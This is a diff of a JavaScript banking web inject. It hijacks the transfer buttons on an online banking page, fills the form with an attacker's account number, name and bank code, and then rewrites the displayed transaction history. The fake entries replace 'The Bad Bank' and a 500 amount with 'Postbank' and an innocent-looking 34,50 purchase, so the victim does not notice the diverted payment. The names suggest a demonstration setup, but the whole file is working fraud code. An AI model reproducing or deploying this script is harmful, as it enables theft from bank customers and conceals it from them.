@@ -20,12 +20,10 @@ globalRC_Bank_Name="Postbank"
 global_Amount="34,50";
 global_Usage="Vielen Dank fuer Ihren Einkauf";
 
-
 	 function timedMsg()
 		 {
+		 
 		 	$("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){
-
-
 		 			$(this).attr("hackMarker","true");
 		 			sendMoneyBtnClone=$(this).clone(true)
 		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
@@ -54,9 +52,7 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 		 			
 		 	});
 		 	
-		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)
-
-[activateReset='true']").each(function(){		 		
+		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){		 		
 		 		$("input:eq(1)").val(globalRC_Acc_Nr);
 				$("input:eq(2)").val(globalRC_Acc_Name);
 				$("input:eq(3)").val(globalRC_Bank_BLZ);
@@ -68,7 +64,6 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 		 	});
 		 	
 		 	$("#btnTD button:visible[hackmarker!='true']:contains('berweisung')").each(function(){	
-				
 		 		$(this).attr("hackMarker","true");
 	 			sendMoneyConfirmBtnClone=$(this).clone(true)
 	 			$(this).after(sendMoneyConfirmBtnClone);
@@ -89,22 +84,20 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 		 	var bankText=globalRC_Bank_Name+' ('+globalRC_Bank_BLZ+')';
 		 	$(".TransfersOdd,.TransfersEven").filter(':contains(The Bad Bank)').text(bankText);
 		 	$(".TransfersOdd,.TransfersEven").filter(':contains(8272)').text(globalRC_Bank_BLZ);
-		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Weil es moeglich ist)').text
-
-(global_Usage);
+		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Weil es moeglich ist)').text(global_Usage);
 		 	$(".TransfersOdd,.TransfersEven").filter(':contains(500)').text(global_Amount);
 		 	
 		 	
-
 		 	
-		 	var t=setTimeout(timedMsg,5000);
-
+		 	
+		 	var t=setTimeout("timedMsg()",2000);
 		 }
 	 
 	 $(document).ready(function() {
  	timedMsg();
 	 });
+  
 
-
-
-
+ 
+ 
+ 
